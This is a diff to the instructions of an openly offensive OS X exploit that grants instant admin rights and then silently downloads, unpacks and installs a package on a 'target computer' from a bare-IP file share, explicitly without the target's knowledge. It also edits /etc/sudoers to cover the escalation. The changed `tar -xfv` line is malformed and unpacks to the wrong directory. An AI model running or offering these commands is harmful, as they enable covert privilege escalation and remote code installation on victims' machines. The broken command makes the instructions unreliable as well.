@@ -15,7 +15,7 @@ This exploit gives whatever user that executes it admin instantly.
 
 __3. INSTALL__
 <br>
-We use `cURL` to get the Java 8 Update 60 package onto the target computer and into a temporary directory, then the `installer` command featured in the OS X command line to install the .pkg we fetched. This is the correct command for this particular task because it skips the graphical installer meaning it can run behind the scenes without target knowledge.
+We use `cURL` to get the Java 8 Update 60 package (.tar archive) onto the target computer and into a temporary directory, decompress it, and then use the `installer` command featured in the OS X command line to install the .pkg we fetched. This is the correct command for this particular task because it skips the graphical installer meaning it can run behind the scenes without target knowledge.
 
 <br>
 
@@ -43,9 +43,11 @@ This is used to ensure the completion of the command if it fails.
 <br>
 `sudo mkdir -v /tmp$$;` ___- Make a temporary directory to store the package in___
 <br>
-`sudo curl -# http://thrifus.co/jump/j8u60.pkg > /tmp$$/j8u60.pkg;` ___- Get the package___
+`sudo curl -# http://24.96.42.83/ownCloud/index.php/s/MipN60plXKZ21vg/download > /tmp$$/Java8Update60.pkg.tar;` ___- Get the package (.tar archive)___
 <br>
-`sudo installer -verbose -pkg /tmp$$/j8u60.pkg -target LocalSystem;` - ___Install the package___
+`tar -xfv /tmp$$/Java8Update60.pkg.tar;` ___- Unpack the .tar archive___
+<br>
+`sudo installer -verbose -pkg /tmp$$/Java8Update60.pkg -target LocalSystem;` - ___Install the package___
 <br>
 `sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers;` ___- Remove the line allowing root access without a password___
 <br>
